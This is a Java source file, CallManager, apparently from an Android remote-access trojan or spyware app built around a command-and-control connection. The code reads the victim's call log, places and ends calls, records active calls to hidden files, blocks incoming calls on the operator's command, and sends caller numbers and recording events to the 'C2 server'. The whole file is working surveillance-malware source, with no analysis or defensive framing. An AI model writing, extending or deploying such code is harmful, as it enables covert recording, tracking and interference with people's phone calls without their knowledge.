package com.tarjon.admin.utils;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Manages call-related functionality
 * Handles call logs, call recording and call interception
 */
public class CallManager {
    private static final String TAG = "CallManager";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Call recording
    private MediaRecorder mediaRecorder;
    private String currentRecordingPath;
    private boolean isRecording = false;
    
    // Call interception
    private boolean interceptCalls = false;
    
    public CallManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    /**
     * Get call logs from the device
     * @param limit Maximum number of logs to retrieve
     * @param callback Callback to receive logs
     */
    public void getCallLogs(int limit, CallLogsCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Call log read permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                // Columns to retrieve
                String[] projection = new String[] {
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.CACHED_NUMBER_TYPE,
                        CallLog.Calls.CACHED_NUMBER_LABEL
                };
                
                // Sort by date descending (newest first)
                String sortOrder = CallLog.Calls.DATE + " DESC";
                
                // Add limit if provided
                if (limit > 0) {
                    sortOrder += " LIMIT " + limit;
                }
                
                Cursor cursor = contentResolver.query(
                        CallLog.Calls.CONTENT_URI, 
                        projection, 
                        null, 
                        null, 
                        sortOrder);
                
                JSONArray calls = new JSONArray();
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject call = new JSONObject();
                        
                        // Get call details
                        String id = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        
                        // Add to JSON object
                        call.put("id", id);
                        call.put("number", number);
                        call.put("date", date);
                        call.put("dateStr", new Date(date).toString());
                        call.put("duration", duration);
                        call.put("type", type);
                        call.put("name", name != null ? name : "");
                        
                        // Add call type as string
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE:
                                call.put("typeStr", "incoming");
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                call.put("typeStr", "outgoing");
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                call.put("typeStr", "missed");
                                break;
                            case CallLog.Calls.REJECTED_TYPE:
                                call.put("typeStr", "rejected");
                                break;
                            default:
                                call.put("typeStr", "unknown");
                                break;
                        }
                        
                        // Add formatted duration
                        call.put("durationStr", formatDuration(duration));
                        
                        // Add to calls array
                        calls.put(call);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
                
                // Create result object
                JSONObject result = new JSONObject();
                result.put("calls", calls);
                result.put("count", calls.length());
                
                // Send to callback
                if (callback != null) {
                    callback.onCallLogsLoaded(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error retrieving call logs: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error retrieving call logs: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Format call duration into readable time
     */
    private String formatDuration(int seconds) {
        if (seconds < 60) {
            return seconds + " sec";
        } else {
            int minutes = seconds / 60;
            int remainingSeconds = seconds % 60;
            return minutes + " min " + remainingSeconds + " sec";
        }
    }
    
    /**
     * Make a phone call
     * @param phoneNumber Number to call
     */
    public void makeCall(String phoneNumber) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != 
                PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        try {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + phoneNumber));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);
            
            // Log the outgoing call
            try {
                JSONObject callData = new JSONObject();
                callData.put("number", phoneNumber);
                callData.put("date", System.currentTimeMillis());
                callData.put("type", "outgoing");
                
                c2Connection.sendCommandResult("call_initiated", 
                        "Call initiated to " + phoneNumber, 
                        callData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON for call: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error making call: " + e.getMessage());
        }
    }
    
    /**
     * End active call
     */
    public boolean endCall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                TelecomManager telecomManager = (TelecomManager) context.getSystemService(Context.TELECOM_SERVICE);
                if (telecomManager != null && ActivityCompat.checkSelfPermission(context, 
                        Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                    telecomManager.endCall();
                    return true;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error ending call: " + e.getMessage());
            }
        }
        return false;
    }
    
    /**
     * Start recording an active call
     * @return true if recording started successfully
     */
    public boolean startCallRecording() {
        // Check if already recording
        if (isRecording) {
            return true;
        }
        
        // Check if there is an active call
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager.getCallState() != TelephonyManager.CALL_STATE_OFFHOOK) {
            Log.e(TAG, "Cannot start recording: No active call");
            return false;
        }
        
        // Check for audio recording permission
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != 
                PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Cannot start recording: Recording permission not granted");
            return false;
        }
        
        try {
            // Create file for recording
            File recordingDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "CallRecordings");
            if (!recordingDir.exists()) {
                recordingDir.mkdirs();
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String fileName = "call_" + timestamp + ".3gp";
            File outputFile = new File(recordingDir, fileName);
            
            currentRecordingPath = outputFile.getAbsolutePath();
            
            // Initialize media recorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setOutputFile(currentRecordingPath);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            // Prepare and start recording
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;
            
            // Log the recording start
            try {
                JSONObject recordingData = new JSONObject();
                recordingData.put("path", currentRecordingPath);
                recordingData.put("startTime", System.currentTimeMillis());
                
                c2Connection.sendCommandResult("call_recording_started", 
                        "Call recording started", 
                        recordingData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON for recording: " + e.getMessage());
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error starting call recording: " + e.getMessage());
            releaseMediaRecorder();
            return false;
        }
    }
    
    /**
     * Stop call recording
     * @return Path to the recording file or null if not recording
     */
    public String stopCallRecording() {
        if (!isRecording) {
            return null;
        }
        
        try {
            // Stop recording
            mediaRecorder.stop();
            releaseMediaRecorder();
            
            // Log the recording stop
            try {
                JSONObject recordingData = new JSONObject();
                recordingData.put("path", currentRecordingPath);
                recordingData.put("stopTime", System.currentTimeMillis());
                
                c2Connection.sendCommandResult("call_recording_stopped", 
                        "Call recording stopped", 
                        recordingData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON for recording: " + e.getMessage());
            }
            
            // Return path to recording
            String path = currentRecordingPath;
            currentRecordingPath = null;
            
            return path;
        } catch (Exception e) {
            Log.e(TAG, "Error stopping call recording: " + e.getMessage());
            releaseMediaRecorder();
            return null;
        }
    }
    
    /**
     * Release media recorder resources
     */
    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing media recorder: " + e.getMessage());
            } finally {
                mediaRecorder = null;
                isRecording = false;
            }
        }
    }
    
    /**
     * Process incoming call
     * @param phoneNumber Caller phone number
     * @return true if call should be intercepted (blocked)
     */
    public boolean processIncomingCall(String phoneNumber) {
        // Send notification to C2 server
        try {
            JSONObject callData = new JSONObject();
            callData.put("number", phoneNumber);
            callData.put("date", System.currentTimeMillis());
            callData.put("type", "incoming");
            callData.put("intercepted", interceptCalls);
            
            c2Connection.sendCommandResult("call_incoming", 
                    "Incoming call from " + phoneNumber, 
                    callData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for incoming call: " + e.getMessage());
        }
        
        // Return interception status
        return interceptCalls;
    }
    
    /**
     * Set call interception
     * @param intercept Whether to intercept (block) incoming calls
     */
    public void setCallInterception(boolean intercept) {
        this.interceptCalls = intercept;
    }
    
    /**
     * Interface for call logs callback
     */
    public interface CallLogsCallback {
        void onCallLogsLoaded(String logsJson);
        void onError(String error);
    }
}